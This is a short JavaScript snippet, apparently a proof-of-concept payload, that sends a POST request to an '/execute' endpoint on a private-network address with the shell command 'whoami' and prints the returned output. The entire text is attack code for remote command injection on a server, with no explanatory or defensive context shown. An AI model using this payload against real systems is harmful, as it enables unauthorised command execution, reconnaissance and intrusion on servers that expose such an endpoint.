// Injecting a command to be executed
var command = "whoami"; // Command to get the current user
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://10.102.151.24:5000/execute", true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
        console.log("Command output: " + xhr.responseText);
    }
};
xhr.send(JSON.stringify({ command: command }));

